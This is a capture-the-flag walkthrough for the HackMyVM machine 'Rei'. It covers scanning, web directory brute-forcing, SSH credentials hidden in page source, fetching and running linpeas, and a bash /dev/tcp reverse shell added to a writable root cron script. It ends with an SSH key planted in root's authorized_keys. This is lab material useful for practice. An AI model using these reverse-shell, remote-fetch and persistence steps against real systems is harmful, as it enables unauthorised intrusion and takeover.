@@ -1,0 +1,139 @@
+### Write up for https://hackmyvm.eu/machines/machine.php?vm=Rei ###
+
+ip=machinesip
+
+threader3000
+
+63777/tcp open  http    lighttpd 1.4.59
+|_http-server-header: lighttpd/1.4.59
+|_http-title: Welcome page
+65333/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 25:62:b8:14:da:7d:e9:ea:48:4c:a9:31:08:cd:c5:78 (RSA)
+|   256 b8:51:f8:62:de:16:09:d0:f9:a8:2c:c3:3b:09:a1:e3 (ECDSA)
+|_  256 f4:f5:6c:ac:81:ed:06:14:ea:07:de:56:ac:34:ca:be (ED25519)
+
+
+url=http://$ip:63777
+
+feroxbuster -n -w  /usr/share/seclists//Discovery/Web-Content/directory-list-2.3-medium.txt -u $url -x php,htlm,txt,tar,zip,old,bak,htm -t 500 -e -o ferox-$ip-main.txt
+
+200      GET       52l      430w     3548c http://$ip:63777/
+301      GET        0l        0w        0c http://$ip:63777/js => /js/
+301      GET        0l        0w        0c http://$ip:63777/javascript => /javascript/
+200      GET       74l      233w    16242c http://$ip:63777/robots.txt
+
+
+wget $url/robots.txt
+nothing special
+
+i tried every single folder 
+but it was a dead end.
+
+lets read the home page and the source-code.
+<li>Additional documentation can be found at<span class="bold tt">&quot;text&quot;</span> archive: <span class="tt">$ip </span>in the default directory <span class="tt">/var/www/html/ </span>.</li>
+
+indexp and text
+
+wget $url/indexp.txt
+cat indexp.txt| grep Allow:
+Allow: /gp/dmusic/promotions/AmazonMusicUnlimited
+Allow: /wishlist/universal
+Allow: /wishlist/vendor-button
+Allow: /wishlist/your-button
+Allow: /gp/wishlist/universal
+Allow: /gp/wishlist/vendor-button
+Allow: /gp/wishlist/ipad-install
+Allow: /gichin/
+Allow: /gichin/your-button
+
+lets not lose time and get to the point
+
+feroxbuster -n -w  /usr/share/seclists//Discovery/Web-Content/directory-list-2.3-medium.txt -u $url/gichin/your-button/ -x php,htlm,txt,tar,zip,old,bak,htm -t 500 -e
+
+http://$ip:63777/gichin/your-button/ssh 
+http://$ip:63777/gichin/your-button/note.html
+
+visit http://$ip:63777/gichin/your-button/note.html
+we can find a greeting from ShellDredd
+
+ <div align="center"><a style="font-weight: bold;" title="ENTER" href="chuck-norris.html" target=""><img class="icon-intro" src="karate1.gif" width="400px"></a></div>
+
+chuck-norris.html
+
+visiting that link we get 
+
+ <div align="center"><a style="font-weight: bold;" title="chuck-norris is the user master" href="#" target=""><img class="icon-intro" src="lee.gif" width="400px"></a></div>
+    </div>
+    <div class="caja-texto">
+        <h2>Balance is key.<br>If balance is good, karate is good.</h2>
+
+
+Balance is key.
+chuck-norris is the user master
+
+lets try ssh with user chuck-norris and pass Balance
+balance
+
+we got shell
+we cant use cat :)
+so i used less user.txt // pico can be used too!
+
+upload linpeas
+
+on a new terminal
+python3 -m http.server 80
+
+on chuck-norris shell
+wget yourip/linpeas.sh
+chmod +x linp*
+./linp*
+
+Interesting writable files owned by me or writable by everyone (not in Home)
+/lost+found/sakugawa-kanga.sh
+
+cd /lost+found/
+
+we cant use cd
+
+lets try pico
+
+pico /lost+found/sakugawa-kanga.sh
+comment out everything and add the last line in order to get reverse shell
+                                                                                                     
+#!/bin/bash
+#echo "_____________________________________________" >> /home/chuck-norris/.local/share/nano/.edit.conf
+#echo "KARATE_CON_TE_WARE extracting information at:" >> /home/chuck-norris/.local/share/nano/.edit.conf
+#date >> /home/chuck-norris/.local/share/nano/.edit.conf
+#echo "---------------------------------------------" >> /home/chuck-norris/.local/share/nano/.edit.conf
+
+bash -i >& /dev/tcp/YOURIP/3345 0>&1
+
+
+
+on a new terminal 
+nc -nvlp 3345
+
+wait a bit and you get root access
+
+cd /root/.ssh
+echo 'YOUR ID_RSA' >> authorized_keys
+
+now ssh with root
+
+cat root.txt
+ Maritrini plays with you, call her by name from the       | 
+ | hidden area and maybe she will give you back the password.|
+
+ locate Maritrini
+ nothing
+ lets try with maritrini
+
+ locate maritrini
+ /mnt/.maritrini
+ 
+ cat /mnt/.maritrini
+
+root@karate:~# id; hostname
+uid=0(root) gid=0(root) groups=0(root)
+karate
